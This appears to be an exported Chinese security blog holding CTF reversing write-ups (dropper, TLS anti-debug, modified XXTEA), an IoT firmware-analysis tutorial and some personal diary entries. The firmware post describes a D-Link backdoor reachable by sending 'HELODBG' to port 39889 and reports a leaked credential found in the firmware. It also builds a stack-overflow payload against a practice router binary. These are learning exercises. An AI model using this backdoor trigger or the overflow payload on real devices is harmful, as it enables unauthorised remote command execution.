「T :」 T &#x3D; 0;J&#x3D;0; 处理器处于 ARM 状态 T &#x3D; 1;J&#x3D;0 处理器处于 Thumb 状态 T &#x3D; 1;J&#x3D;1 处理器处于 ThumbEE 状态 控制位 CPSR的低8位(包括I,F,T和M[4:0])称为控制位,当发生异常时这些位可以被改变,如果处理器运行特权模式,这些位也可以由程序修改。 「中断禁止位I,F」【重要】 I&#x3D;1 禁止IRQ中断 F&#x3D;1 禁止FIQ中断 比如我们要想在程序中实现禁止中断，那么就需要将CPSR[7]置1。 运行模式位[4-0] bite 模式 ARM模式可访问的寄存器 注意观察这5个bit的特点，最高位都是1，低4位的值则各不相同，这个很重要，要想搞清楚uboot、linux的源码，尤其是异常操作的代码，必须要知道这几个bit的值。 流水线 关键指令 跳转 伪代码","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"arm","slug":"arm","permalink":"http://example.com/tags/arm/"}],"author":"1ens"},{"title":"dropper","slug":"dropper","date":"2022-06-29T01:49:45.000Z","updated":"2022-06-29T15:58:39.854Z","comments":true,"path":"2022/06/29/dropper/","link":"","permalink":"http://example.com/2022/06/29/dropper/","excerpt":"","text":"Dropper 什么是Dropper Dropper是将程序嵌入到自己的内部。 类似于双进程，运行后解密了资源表的数据，本题是一个exe文件，然后作为子进程被创建了 解题 开始一个UPX壳，upx -d 的话无法运行 ，手动去壳,试了很多遍， rax会运行错误。 静态分析： （如果不给题目名称如何看出是dropper技术 进入，上面几个qword是函数调用但是识别失败。最后一个异或0x73，解密资源的地方，接着主程序后面就是创建一个进程，并把刚刚解密出的pe文件手动装载进行内存，然后恢复执行。 下面我们用Process-Dump来dump出子程序 如何使用Process Dump 1pd64.exe -pid **** dump出我们需要的子程序， 主要逻辑为一个int a[500]的数组来实现这个大数的存储及运算 这里的第88行*14 通过交叉引用可以推断出是什么，其初始化在Sub_7FF7D0F21433, 将sub_7FF7D0F2167C的地址赋给前四个字节 sub_7FF7D0F2167C函数主要两个功能，对数值的转换，然后check 对大数的运算 调试提取数据，有一个除0异常，直接跳过即可。 12345678910111213141516171819202122232425262728293031323334import base64enc = [0x000020F1, 0x00001DA9, 0x00000156, 0x00000B37, 0x000007C0, 0x0000066A, 0x000024E0, 0x00000D42, 0x00002077, 0x000007EC, 0x00001BA7, 0x00002071, 0x000000F8, 0x00000291, 0x000003DA, 0x0000157C, 0x00001EF4, 0x00002519, 0x00000C25, 0x00002062, 0x00002253, 0x00000640, 0x000008DF, 0x00001E34, 0x00002140, 0x00000F92, 0x0000039B, 0x0000126F, 0x00002403, 0x00000E65, 0x000001F0, 0x00001868, 0x0000016D, 0x000006B6, 0x00002214, 0x00001603, 0x00001925, 0x000016AE, 0x000012D0, 0x00001831, 0x0000018C, 0x00000BF7, 0x00000E97, 0x000000CE, 0x0000061C, 0x00000390, 0x000019E9, 0x000022A5, 0x00001601, 0x00001A1E, 0x000013D1, 0x00000DBC, 0x0000117D, 0x0000225F, 0x00002272, 0x0000007B, 0x000023E6, 0x0000069F, 0x000002D3, 0x00001BEF, 0x000003E6, 0x000017D4, 0x00002284, 0x000003B8, 0x00000251, 0x00001646, 0x00000176, 0x0000081E, 0x000024C3, 0x00001E85, 0x00001097, 0x00001264, 0x00000A34, 0x00001A3B, 0x00000FE7, 0x000026A6, 0x00001F43, 0x00001832, 0x000021AE, 0x0000023C, 0x000004C2, 0x00002585, 0x000017E7, 0x000015DD, 0x00002610, 0x00001B86, 0x00000D2A, 0x00000716, 0x00001C25, 0x00002099]data = [[0x000024AC, 0x00000116, 0x000004F4, 0x00000B64, 0x00001DC3, 0x00001B4A, 0x000001B2, 0x00001FCE, 0x00000E81, 0x000025AB, 0x0000015B, 0x0000252D, 0x000002AC, 0x00000F77, 0x000022F5, 0x000019E3, 0x00001C53, 0x00000B66, 0x000011BC, 0x0000193A], [0x00000DC6, 0x00000854, 0x000015F5, 0x00002567, 0x000008FA, 0x00000E20, 0x00000807, 0x00001007, 0x000018CC, 0x00001E84, 0x00001F11, 0x000013D4, 0x0000076A, 0x00001461, 0x00000B0F, 0x00001F70, 0x00001B3D, 0x00001008, 0x00000D52, 0x0000049A], [0x00001A89, 0x00000E42, 0x000000FA, 0x0000100D, 0x000014DD, 0x00001BFC, 0x000026DB, 0x00001AC2, 0x00001CA0, 0x000005ED, 0x00000834, 0x000016BF, 0x00000704, 0x00001FAD, 0x000025FD, 0x00001142, 0x00001EEE, 0x00001E60, 0x00000353, 0x000015A8], [0x00000E17, 0x00000706, 0x00000C1F, 0x00000169, 0x00002248, 0x000007FD, 0x00001768, 0x00001F54, 0x00001574, 0x00002458, 0x00000374, 0x00001D6B, 0x00000918, 0x00000ECF, 0x0000211D, 0x00001D96, 0x00001BEB, 0x00001703, 0x00001B87, 0x000006FA], [0x00000AE3, 0x0000069F, 0x000001EF, 0x00001C15, 0x00001378, 0x000020D1, 0x0000211D, 0x00002275, 0x000005F4, 0x00002475, 0x00000D13, 0x000008EF, 0x00000E10, 0x000006D4, 0x0000215A, 0x000004D6, 0x0000202F, 0x00001B99, 0x00001C86, 0x000002F1], [0x00000680, 0x000000D4, 0x00000677, 0x00001E21, 0x0000220D, 0x00000933, 0x00000973, 0x00001947, 0x00000D61, 0x0000247F, 0x00001D21, 0x00001FA2, 0x00001606, 0x000007B0, 0x00001829, 0x000016C0, 0x000026C9, 0x0000248C, 0x00000C9A, 0x00001F8F], [0x0000257F, 0x00000359, 0x00001831, 0x000021B7, 0x00000BA8, 0x00000FC5, 0x00000BA4, 0x000024E2, 0x00001241, 0x00000D53, 0x00000C82, 0x00001240, 0x00002241, 0x00001156, 0x0000116A, 0x000005F3, 0x000022D5, 0x000008DA, 0x000014A3, 0x0000059E], [0x00001675, 0x00000AA9, 0x00000D8B, 0x00000D31, 0x00001722, 0x000006C8, 0x0000151B, 0x000017D8, 0x00001FEF, 0x00001624, 0x00002307, 0x00000CB9, 0x0000053C, 0x00000230, 0x00001EAA, 0x00001FD1, 0x00000FAD, 0x00001E30, 0x00002345, 0x00001583], [0x000001D1, 0x0000056E, 0x00000AA3, 0x0000223C, 0x000009A4, 0x000006C9, 0x00000112, 0x00001977, 0x00002512, 0x00000B60, 0x0000081A, 0x00000F06, 0x00001329, 0x000011AA, 0x00002404, 0x00000E57, 0x0000011E, 0x000011DC, 0x00002474, 0x00001BC7], [0x000022BE, 0x00001F17, 0x00000588, 0x00001B80, 0x00001479, 0x000016EF, 0x000008CA, 0x00000D6E, 0x0000138F, 0x00001054, 0x000021FA, 0x00000102, 0x000013A6, 0x00000195, 0x000002D1, 0x00002594, 0x00001369, 0x00002534, 0x000015C5, 0x0000168A]]enc1 = 0for i in enc[::-1]: enc1 = enc1*10000+idata1= [0]*10for i, val in enumerate(data): #enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中 for j in val[::-1]: data1[i] = data1[i]*10000+jenc1 += data1[9]enc1 -= data1[8]enc1 += data1[7]enc1 -= data1[6]enc1 += data1[5]enc1 //= data1[4]enc1 -= data1[3]enc1 += data1[2]enc1 //= data1[1]enc1 -= data1[0]ans = &#x27;&#x27;while enc1: ans += chr(enc1%128) enc1 //= 128print(base64.b64decode(ans))","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-[ACTF] -[dropper]","slug":"ACTF-dropper","permalink":"http://example.com/tags/ACTF-dropper/"}],"author":"1ens"},{"title":"固件分析初试","slug":"固件逆向分析初试","date":"2022-06-24T11:50:10.000Z","updated":"2022-07-14T14:41:44.981Z","comments":true,"path":"2022/06/24/固件逆向分析初试/","link":"","permalink":"http://example.com/2022/06/24/%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%88%9D%E8%AF%95/","excerpt":"","text":"m U-Boot(Universal Boot Loader)，即通用Bootloader，是德国DENX小组开发的用于多种嵌入式CPU的bootloader程序 Legacy-uImage在kernel镜像的基础上，加上64Byte的信息提供给uboot使用 binwalk分析一下，是Squashfs文件系统 Binwalk如何进行提取：通过maigc特征集与文件进行比对，但识别效率比file命令高多了 binwalk -Me 解压得到 文件系统是操作系统的重要组成部分，是操作运行的基础。不同的路由器使用的文件系统格式不尽相同。根文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中。路由器希望文件系统越小越好，所以这些文件系统中各种压缩格式随处可见。 Squashfs是一个只读格式的文件系统，具有超高压缩率，其压缩率最高可达34%。当系统启动后，会将文件系统保存在一个压缩过的文件系统文件中，这个文件可以使用换回的形式挂载并对其中的文件进行访问，当进程需要某些文件时，仅将对应部分的压缩文件解压缩。 Squashfs文件系统常用的压缩格式有GZIP、LZMA、LZO、XZ（LZMA2）。路由器的根文件系统通常会按照Squashfs文件系统常用压缩格式中的一种进行打包，形成一个完整的Squashfs文件系统，然后与路由器操作系统的内核一起形成更新固件。 由于squashFS可以在不需要解压的情况下直接挂载，因此有许多应用场景，例如： 1、安装Linux时用的live cd 2、小型嵌入式设备中的rootfs。rootfs一般以压缩好的形式存放在ROM中，如果开机时把整个rootfs都解压到内存里再读取，对于ROM和RAM容量一般都很小的小型嵌入式设备来说性价比太低。 0x2 静态分析从Dlink固件里面提取样本，打开发现被加密了。 如生成字典用的crunch、rsmangler，爆破用的frackzip等 直接使用教程的密码beUT9Z，解压如下 .mbn：高通的一套用于加载网络环境的文件（modem software configuration） .yaffs2：针对NAND芯片设计的嵌入式文件系统，可用unyaffs提取 核心应该是2K-mdm-image-mdm9625.yaffs2，用unyaffs提取 1unyaffs 2K-mdm-image-mdm9625.yaffs2 yaffs2-root/ 接下来我们查找该路径下的所有.conf文件，.conf文件多是配置文件，有可能从中可以发现敏感的信息。 1find . -name &#x27;*.conf&#x27; 其中的inadyn-mt.conf文件引起了我们注意，这是no-ip应用的配置文件，no-ip就是一个相当于花生壳的东西，可以申请动态域名。我们从中可以发现泄露的no-ip的登陆账号及密码。 我们还从shadow文件中找到了root账号的密码，通过爆破可以得到root的密码为1234。 接下来使用firmwalker来自动化遍历固件系统中的所有可疑文件。 1git clone https://github.com/craigz28/firmwalker.git Firmwalker是一个bash脚本，用于扫描从IoT固件提取的文件以查看它们是否容易受到攻击。唯一的要求是该工具和提取的固件文件应位于同一文件夹中。 将它们放置在相同的位置后，由Firmwalker生成的输出文件-Firmwalker.text-将突出显示潜在问题的列表，可以是以下任意一个： etc &#x2F; ssl目录etc &#x2F; passwd和etc &#x2F; shadow配置，脚本和其他.bin文件关键字，例如远程，管理员，密码等。常见的二进制文件，例如dropbear，tftp和ssh物联网设备上存在的常见Web服务器随机IP地址，电子邮件ID和URL使用Shodan CLI调用Shodan API的实验功能面临任何这些问题的所有物联网设备都容易受到攻击。 1./firmwalker.sh yaffs2-root/ 除了配置文件外，分析存在风险的二进制程序也很重要。查看自启动的程序，在etc&#x2F;init.d目录下存放启动时运行的程序和脚本，一个start_appmgr脚本引起了我们注意，mgr一般就是主控程序的意思。 查看脚本，该脚本会在开机的时候以服务的形式运行&#x2F;bin&#x2F;appmgr程序。 用IDA打开该文件 发现一个后门，这个漏洞被收录到CVE-2016-10178 只要连接该固件的39889端口并发送HELODBG的字符串，就可以进行远程执行命令。 动态调试采用Attify 1./fat.py &#x27;/home/iot/Documents/DWP2360b-firmware-v206-rc018.bin&#x27; 通过192.168.0.50即可访问固件 调试固件用到了Damn Vulnerable Router Firmware这个项目 先用binwalk解压 提取出来的目录里有个文件夹pwnable，里面存放着漏洞程序示例，选取stack_bof_01程序进行实验，程序的源代码可以在DVRF&#x2F;Pwnable Source&#x2F;Intro&#x2F;里查看 先用readelf查看文件信息，mips架构 小端序。。。 文件的主要逻辑：strcpy造成了栈溢出，存在后面函数。 动调拷贝wmu-mipsel-static到固件根目录 1cp (which qemu-mipsel-static) . 用qemu虚拟运行stack_bof_01： 以调试的方式启动程序，并在1234端口进行监听： 1sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 1111 打开一个新的shell，运行以下命令： 1234567gdb-multiarch pwnable/Intro/stack_bof_01# 设置架构set architecture mips#设置调试端口target remote 127.0.0.1:1234 计算偏移v 12345iot@attifyos ~/D/D/F/_/squashfs-root&gt; python2 -c &quot;print &#x27;a&#x27;*204+&#x27;\\x50\\x09\\x40\\x00&#x27;&quot; &gt;payloadiot@attifyos ~/D/D/F/_/squashfs-root&gt; sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 (cat payload) 如果直接把跳转地址设置为后门函数dat_shell的起始地址0x400950会触发异常 程序成功跳转至dat_shell，但依旧崩溃,因为我们溢出的时候把 $gp 寄存器也覆盖了，$gp 寄存器是用来全局指针寻址用的，覆盖了他就会导致程序无法正常寻址，自然程序就会 crash。 查询MIPS指令集，MIPS跳转方式： 1.设置t9寄存器数值，跳转到t9寄存器； 2.在执行某个函数之前，将要跳转的地址保存在ra寄存器中，执行函数后可跳转。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"固件分析","slug":"固件分析","permalink":"http://example.com/tags/%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/"}],"author":"1ens"},{"title":"碎碎念","slug":"碎碎念","date":"2022-05-30T10:44:28.000Z","updated":"2022-07-11T11:25:35.706Z","comments":true,"path":"2022/05/30/碎碎念/","link":"","permalink":"http://example.com/2022/05/30/%E7%A2%8E%E7%A2%8E%E5%BF%B5/","excerpt":"","text":"我知道你的状态不对，希望你可以及时调整过来。 不要悲观，又或者静不下心来。 或者你又对这个世界充满了愤懑，又或者松懈了，没有按时完成自己的计划。 去洗个澡，去跑步，调整自己。 不要太看重结果，尽力而为“你太急切的想要一个答案了。想要风光的学位，瞬间的博学，想要意气风发，想闪着金光走向喜欢的人。但现实告诉我，操之过急便会败北，他要我等，要我耐得住不断延长的时间线，要我交付出足够的努力堆砌在沉闷、晦涩的时光里，才肯将一切“我想要”一点一点递送至我手里。“我知道你最近很累，是那种看不见的，身体上和精神上的疲惫感，但是请你一定要坚持下去。就算无人问津也好，技不如人也罢，千万别让烦恼和焦虑毁了你本就不多的热情和定力。 别贪心,我们不可能什么都有，别担心，我们也不可能什么都，没有。“不要再这样下去，一晚一晚的熬。想东想西，实在是矫情，真的该关掉手机，断了一些没必要的联系，扔掉所有负能量，认认真真的生活，再去做一些正儿八经的事儿。”“你要留点精力去读书去运动去爱人，去奔赴你想要的生活，不应该把精力浪费在痛苦的事情，看起来可以挽回的事情，仔细想想一点都不值得，贪恋过去的快乐注定走不远，过去的就让它. 再见考研，再见我的二十一岁。 (bilibili.com) 你真的能做到吗，总得试试吧 站起来，去做出选择，去再一次挑战，去提升自己。不要留遗憾。 李大仁送给程又青的方头狮与众不同的这件事，常常让它『卡住』，卡在『自己的原则里』 卡在『该不该妥协的挣扎里』、 卡在『会不会全世界都对了，只有我的坚持是错的迷失里……』 不要害怕自己的不一样，不要把约定陈俗当成信条，要勇敢的活出自己的精神！ 正义、直率、聪明、磊落、还有你的不轻易妥协… 程又青就是这么独一无二 只是没有人懂，这或许也是别人觉得你最不完美的地方吧 永远支持你做自己！ 永远尊重你的选择，不强迫你做不喜欢的事情。 铁马冰河入梦来，心里的涛声彻夜的晃醒的异常的早，期末在即，却没有心思学下去，仿佛还没能从昨日的糟心事中走出来 给自己一点时间，你应该做的是去调整自己，以一个新的姿态，去迎接新的挑战。昨日已去 你现在一无所有，除了可以支配的时间， 现在是fw，但是以后不可以是。 好了，去做你该做的事情吧。 忍耐的灵魂啊安静的运转吧在长清的大学生活结束了，在彩石的坐牢生活即将开始。 一段感情，疫情，311，CTF ，逆向，加入SU，社团，失败的国赛，这两年。 后来才明白，孤独才是人生的常态，一蓑烟雨，一任阶前，点滴到天明。 坚持自己的底线吧，做自己真正想做的事情，不要被外界所干扰，任它奚落。 不要后悔过去，即使遗憾，真正重要的是你能不能吸取教训，去成为更好的人。 高中不知道班主任那句活在当下的真正意义，现在似乎有点明白了 我想再加一句，“眺望未来”· 考研，一鼓作气把岸上，iot，接下来的两年。 对接下来的自己一些劝告， 耐住性子，明白你真正想要什么。 沉稳一点，目前的自己内心还不够强大。 考研并不是你人生的唯一出路，即使失败又何妨， 但是要尽力，要好好准备，即使最后结果不如人意。 切忌眼高手低，不可三心二意，要坚持认真准备每一步。 树欲静而风不止人事物总是展现他最光鲜亮丽的一面，你无法窥探一切的真相。 以血缘关系，利益关系为主的人情社会，无处不在。 你想体面的活下去，得有自己的价值。 而你现在拥有的最多的就是时间，你可以选择刷一天视频，都一天游戏 短暂的欢乐之后只剩下无尽的空虚。 又常常会想，躺平为何不可呢，为什么要这么累。 大抵是对现状的不满，向上走的欲望，为了更好的活着","categories":[{"name":"杂谈","slug":"杂谈","permalink":"http://example.com/categories/%E6%9D%82%E8%B0%88/"}],"tags":[{"name":"解语","slug":"解语","permalink":"http://example.com/tags/%E8%A7%A3%E8%AF%AD/"}]},{"title":"Hack For Fun","slug":"Hack-for-fun","date":"2022-05-28T16:00:00.000Z","updated":"2022-05-29T16:02:55.741Z","comments":true,"path":"2022/05/29/Hack-for-fun/","link":"","permalink":"http://example.com/2022/05/29/Hack-for-fun/","excerpt":"","text":"开一个新系列，解语。 有一些事情你自己得与自己和解。 没有章程，逻辑混乱，写给以后的自己。 尽人事，听天命，顺气自然。 或许这才是真实的fucking世界，或许你又遭遇到了一次失败，或许你又搞砸了一段感情，或许你又遭遇一次不公。 不要在意别人的目光，做人要有原则，不要把成绩看得太重要，做事尽力就好，剩下的交给天命。 在这个快餐时代，一切都变得急功近利，触碰到利益的事情就会有不公。 你该怎么办，是气馁，是愤懑，还是放弃，再一次看，你一定遇到挫折了吧。 世界上还有爱你的父母，一起的朋友，很多想要做的事情。 就像amazh👴说的 :“不要把成绩看的太重” 接管了社团，好像搞的一团糟，没有这方面的天赋。 失败是暂时的，真正的强者是如何面对失败. 下个星期，期末加油 之前的你已经不在，都停留在岁月里面，过好每一个明天，去成为更好的人类。 打ctf的意义是什么，为了奖项？为了成绩？ 都不是 提升自己才是最初的目的，菜就多学。希望早日成为带佬！！！ 本来还有好多话要说，一时又想不起来 坚持自己的原则，花钱py真的没有必要， ​ -2022 5 30 0.03","categories":[{"name":"杂谈","slug":"杂谈","permalink":"http://example.com/categories/%E6%9D%82%E8%B0%88/"}],"tags":[{"name":"解语","slug":"解语","permalink":"http://example.com/tags/%E8%A7%A3%E8%AF%AD/"}],"author":"1ens"},{"title":"JIT","slug":"JIT","date":"2022-05-27T16:00:00.000Z","updated":"2022-05-29T13:24:49.962Z","comments":true,"path":"2022/05/28/JIT/","link":"","permalink":"http://example.com/2022/05/28/JIT/","excerpt":"","text":"什么是JITJIT &#x3D; Just In Time即时编译，是动态编译的一种形式，是一种优化虚拟机运行的技术。程序运行通常有两种方式，一种是静态编译，一种是动态解释，即时编译混合了这二者。 lujit运行过程： 解题： 得到一个.out 文件，电脑识别成Wireshark 系列文件，拉入WinHex会发现是.LJ开头，可以推断是Luajit逆向。 先编译LuaJit2.1.0Beta3Download (luajit.org) 去官网下载 运行x64 Native Tools Command Prompt for VS （用Everything搜索）， 然后将下载的安装包解压到相应的盘下，然后进入解压后的SRC文件 msvcbuild.bat gc64编译出的64位（题目的64位 msvcbuild.bat编译出的是32位 反编译bobsayshilol&#x2F;luajit-decomp at deprecated (github.com) 下载反编译工具 然后将上一步src文件夹里面jit文件夹，和lua51.dll luajit.exe 放到刚刚下载的反编译工具文件夹里面 然后将我们的题目附件改名为test.lua，再按下decoder_new.exe该文件就出现了out.lua和out2.lua 用sublime打开，就可以开始分析字节码了 未完待续。。","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-luajit","slug":"luajit","permalink":"http://example.com/tags/luajit/"}],"author":"1ens"},{"title":"TWIN","slug":"TWIN","date":"2022-05-27T16:00:00.000Z","updated":"2022-05-28T14:18:24.673Z","comments":true,"path":"2022/05/28/TWIN/","link":"","permalink":"http://example.com/2022/05/28/TWIN/","excerpt":"","text":"TLS回调函数：TLS(Thread Local Storage, 线程局部存储)回调函数，TLS 回调函数的调用运行要先于 EP 代码的执行，并且每次创建或结束线程都会再次调用，故常用于反调试。 可以在节区表发现IMAGE_TLS_DIRECTORY，找到Address of Callbacks（注意回调函数一般不止一个） 题解： 32位无壳 首先是一个虚假的逻辑验证。 在函数栏搜索找到callback函数，但是$+5,没有直接反编译，找到主要回调函数 这里有一个小花指令，最好retn会跳到sub_4019BF,后面还会有一处 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158void __usercall sub_4019BF(int a1@&lt;ebp&gt;)&#123; void *v1; // eax if ( *(_DWORD *)(a1 + 12) == 1 ) &#123; memset((void *)(a1 - 284), 0, 0x50u); sub_401930((void *)(a1 - 284)); *(_BYTE *)(a1 - 1) = 0; *(_BYTE *)(a1 - 1) = NtCurrentPeb()-&gt;BeingDebugged; if ( !*(_BYTE *)(a1 - 1) ) return; *(_BYTE *)(a1 - 32) = 57; *(_BYTE *)(a1 - 31) = 51; *(_BYTE *)(a1 - 30) = 62; *(_BYTE *)(a1 - 29) = 56; *(_BYTE *)(a1 - 28) = 0; sub_4018C0(a1 - 32); hObject = CreateFileMappingA(0, 0, 4u, 0, 0x1000u, (LPCSTR)(a1 - 32)); *(_DWORD *)dword_404448 = MapViewOfFile(hObject, 0xF001Fu, 0, 0, 0x1000u); *(_BYTE *)(a1 - 116) = 47; *(_BYTE *)(a1 - 115) = 19; *(_BYTE *)(a1 - 114) = 26; *(_BYTE *)(a1 - 113) = 30; *(_BYTE *)(a1 - 112) = 12; *(_BYTE *)(a1 - 111) = 26; *(_BYTE *)(a1 - 110) = 95; *(_BYTE *)(a1 - 109) = 22; *(_BYTE *)(a1 - 108) = 17; *(_BYTE *)(a1 - 107) = 15; *(_BYTE *)(a1 - 106) = 10; *(_BYTE *)(a1 - 105) = 11; *(_BYTE *)(a1 - 104) = 95; *(_BYTE *)(a1 - 103) = 6; *(_BYTE *)(a1 - 102) = 16; *(_BYTE *)(a1 - 101) = 10; *(_BYTE *)(a1 - 100) = 13; *(_BYTE *)(a1 - 99) = 95; *(_BYTE *)(a1 - 98) = 25; *(_BYTE *)(a1 - 97) = 19; *(_BYTE *)(a1 - 96) = 30; *(_BYTE *)(a1 - 95) = 24; *(_BYTE *)(a1 - 94) = 69; *(_BYTE *)(a1 - 93) = 95; *(_BYTE *)(a1 - 92) = 0; v1 = (void *)sub_4018C0(a1 - 116); sub_401930(v1); *(_BYTE *)(a1 - 8) = 90; *(_BYTE *)(a1 - 7) = 12; *(_BYTE *)(a1 - 6) = 0; sub_4018C0(a1 - 8); sub_401130((char *)(a1 - 8), dword_404448[0]); &#125; if ( !*(_DWORD *)(a1 + 12) ) &#123; *(_BYTE *)(a1 - 24) = 81; *(_BYTE *)(a1 - 23) = 80; *(_BYTE *)(a1 - 22) = 11; *(_BYTE *)(a1 - 21) = 18; *(_BYTE *)(a1 - 20) = 15; *(_BYTE *)(a1 - 19) = 0; sub_4018C0(a1 - 24); sub_401410(); memset((void *)(a1 - 204), 0, 0x44u); *(_DWORD *)(a1 - 204) = 68; CreateProcessA( (LPCSTR)(a1 - 24), 0, 0, 0, 0, 3u, 0, 0, (LPSTARTUPINFOA)(a1 - 204), (LPPROCESS_INFORMATION)(a1 - 136)); *(_BYTE *)(a1 - 44) = 28; *(_BYTE *)(a1 - 43) = 16; *(_BYTE *)(a1 - 42) = 13; *(_BYTE *)(a1 - 41) = 13; *(_BYTE *)(a1 - 40) = 26; *(_BYTE *)(a1 - 39) = 28; *(_BYTE *)(a1 - 38) = 11; *(_BYTE *)(a1 - 37) = 117; *(_BYTE *)(a1 - 36) = 0; *(_BYTE *)(a1 - 16) = 8; *(_BYTE *)(a1 - 15) = 13; *(_BYTE *)(a1 - 14) = 16; *(_BYTE *)(a1 - 13) = 17; *(_BYTE *)(a1 - 12) = 24; *(_BYTE *)(a1 - 11) = 117; *(_BYTE *)(a1 - 10) = 0; *(_BYTE *)(a1 - 88) = 47; *(_BYTE *)(a1 - 87) = 19; *(_BYTE *)(a1 - 86) = 26; *(_BYTE *)(a1 - 85) = 30; *(_BYTE *)(a1 - 84) = 12; *(_BYTE *)(a1 - 83) = 26; *(_BYTE *)(a1 - 82) = 95; *(_BYTE *)(a1 - 81) = 28; *(_BYTE *)(a1 - 80) = 19; *(_BYTE *)(a1 - 79) = 16; *(_BYTE *)(a1 - 78) = 12; *(_BYTE *)(a1 - 77) = 26; *(_BYTE *)(a1 - 76) = 95; *(_BYTE *)(a1 - 75) = 11; *(_BYTE *)(a1 - 74) = 23; *(_BYTE *)(a1 - 73) = 26; *(_BYTE *)(a1 - 72) = 95; *(_BYTE *)(a1 - 71) = 27; *(_BYTE *)(a1 - 70) = 26; *(_BYTE *)(a1 - 69) = 29; *(_BYTE *)(a1 - 68) = 10; *(_BYTE *)(a1 - 67) = 24; *(_BYTE *)(a1 - 66) = 24; *(_BYTE *)(a1 - 65) = 26; *(_BYTE *)(a1 - 64) = 13; *(_BYTE *)(a1 - 63) = 95; *(_BYTE *)(a1 - 62) = 30; *(_BYTE *)(a1 - 61) = 17; *(_BYTE *)(a1 - 60) = 27; *(_BYTE *)(a1 - 59) = 95; *(_BYTE *)(a1 - 58) = 11; *(_BYTE *)(a1 - 57) = 13; *(_BYTE *)(a1 - 56) = 6; *(_BYTE *)(a1 - 55) = 95; *(_BYTE *)(a1 - 54) = 30; *(_BYTE *)(a1 - 53) = 24; *(_BYTE *)(a1 - 52) = 30; *(_BYTE *)(a1 - 51) = 22; *(_BYTE *)(a1 - 50) = 17; *(_BYTE *)(a1 - 49) = 117; *(_BYTE *)(a1 - 48) = 0; sub_401510(a1 - 24, a1 - 136); if ( dword_404440 == 1 ) &#123; sub_4012C0(*(_DWORD *)dword_404448 + 20, 5, &amp;unk_40405C); *(_DWORD *)(a1 - 120) = memcmp((const void *)(*(_DWORD *)dword_404448 + 20), &amp;unk_40402C, 0x14u); if ( !*(_DWORD *)(a1 - 120) ) &#123; sub_4018C0(a1 - 44); sub_401930((void *)(a1 - 44));LABEL_12: CloseHandle(hObject); return; &#125; &#125; else if ( dword_404440 == -2 ) &#123; sub_4018C0(a1 - 88); sub_401930((void *)(a1 - 88)); goto LABEL_12; &#125; sub_4018C0(a1 - 16); sub_401930((void *)(a1 - 16)); goto LABEL_12; &#125;&#125; 这个函数有两大部分 这个a1 + 12就是对应着运行前与退出，对应DLL_PROCESS_ATTACH和DLL_PROCESS_DETACH 所以总结一下！a1 + 12 &#x3D;&#x3D; 1是线程运行之前执行 a1 + 12 &#x3D;&#x3D; 0 是线程退出后运行 首先会遇到一个PEB反调试，我们直接修改ZF标志位绕过。 然后就是一个异或，将原始数据inputflag混肴。 紧接着读取我们的输入， 输入之后F9进入第二部分 获取WriteFile API的地址 将WriteFile API地址改成自写函数的地址（也就是Hook函数） 也就是之后我们调用WriteFile函数地址就会调用Hook函数（Hook函数里执行完Hook代码就会脱钩） GetModuleHandleA得到WiteFile函数的句柄，GetProcAddress函数获取WriteFile函数的地址存入dword_4043DC，并在sub_4016C0中将这个值修改为sub_401650的地址值。 随后在第二个TLS函数会调用ExitProcess()，也就是退出进程，那么退出进程又会调用TLS函数链，于是又回到了第一个TLS函数，不过这次进的是退出线程的函数块，分析主要函数 这里创建了一个文件，也就是tmp文件，但是对名字也进行了混肴,然后往里面写入进程。 我们可以发现这里的writefile变成了我们相要执行的函数 把子进程的两个值改成6，实践上是xxtea在加密过程中的右移轮次。 接下来分析一下tmp文件。 其中 先判断是否被调试，然后对delta进行异或操作。 hObject = CreateFileMappingA(0, 0, 4u, 0, 0x1000u, Name_FLAG);创建名字为FLAG的文件映射对象，用于进程间通信。*(_DWORD *)input = MapViewOfFile(hObject, 0xF001Fu, 0, 0, 0x1000u);存了内存映射文件，便于后面的共享内存。简而言之，就是创建一个名为FLAG的文件映射对象，把input指向的地址设置成一块共享的内存，这样就可以在子进程里对input这块内存进行修改，实现加密。 一个魔改的XXTEA加密，z右移5改成了右移6位 这里一处函数需要注意 WaitForDebugEvent表明父进程调用子进程是以调试方式打开，也就是说父进程调试子进程，所以实际上子进程的反调试是不能绕过的，正常执行程序应该会进入子进程的if语句，对key和delta进行一些魔改运算。0xC0000005，这是一个异常代码，代表EXCEPTION_ACCESS_VIOLATION，内存访问异常，也即子进程中触发的异常。 也就是说，子进程被父进程调试，当子进程发生异常，应当交由调试者（父进程）处理。所以当子进程中触发异常，程序就会流回父进程，判断是否为内存访问异常，如果是，就对eip和eax做出相应修改。 再回去看子进程触发异常的地方，eip+5之后正好跳过了会触发异常的地方。而eax里存储的实际上是delta经过一通魔改运算之后的结果。也就是说，delta不仅在子进程里被修改，还会在父进程里异或一次，也就是还原成之前最初的模样 前一半的（修改的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define DELTA 0x1c925d64#define MX (((z&gt;&gt;6^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))uint32_t k[4]= &#123;0x12,0x90,0x56,0x78&#125;;void xxtea(uint32_t* v, int n, uint32_t* key)&#123; unsigned int sum,z,p,y; int e, rounds; rounds = 6 + 52/n; sum = rounds * DELTA; y = v[0]; do &#123; e = (sum &gt;&gt; 2) &amp; 3; for (p=n-1; p&gt;0; p--) &#123; z = v[p-1]; y = v[p] -= MX; &#125; z = v[n-1]; y = 